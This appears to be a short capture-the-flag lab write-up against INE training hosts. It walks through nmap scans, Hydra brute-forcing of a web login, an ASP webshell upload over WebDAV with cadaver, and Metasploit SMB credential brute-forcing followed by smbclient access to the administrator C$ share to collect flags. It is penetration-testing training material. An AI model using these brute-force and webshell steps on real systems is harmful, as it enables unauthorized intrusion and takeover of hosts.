```
nmap -A target1.ine.local
nmap -A target2.ine.local
```

Open the webpage on Port 80

Run Hydra on login page

```
hydra -l bob -P /usr/share/...../unix_passwords.txt http://target.ine.local http-get
```

After obtaining password, login to the page, and navigate to /webdav
where you can find the `flag1.txt`

after that check `davtest`:
```
davtest -auth bob:password_123321 -url target2.ine.local/webdav
```
- Confirmed ASP file upload capability.

Then upload the webshell using cadaver

```
cadaver http://target2.ine.local/webdav
put /usr/share/webshells/asp/webshell.asp
```

Now access the shell form web
and get the `flag2` from C director.

---
Now Target2

go to msfconsole and search for smb_login
	bruteforce the smb username & password using provided wordlists

after obtaining the creds 
login with smbclient
```
smbclient -L \\\\target2.ine.local\\ -U administrator
```
see for the available Shares
then connect to a specific share
```
smbclient \\\\target2.ine.local\\C$ -U administrator
```
then obtain the `flag3.txt` and `flag4.txt` from downloads

---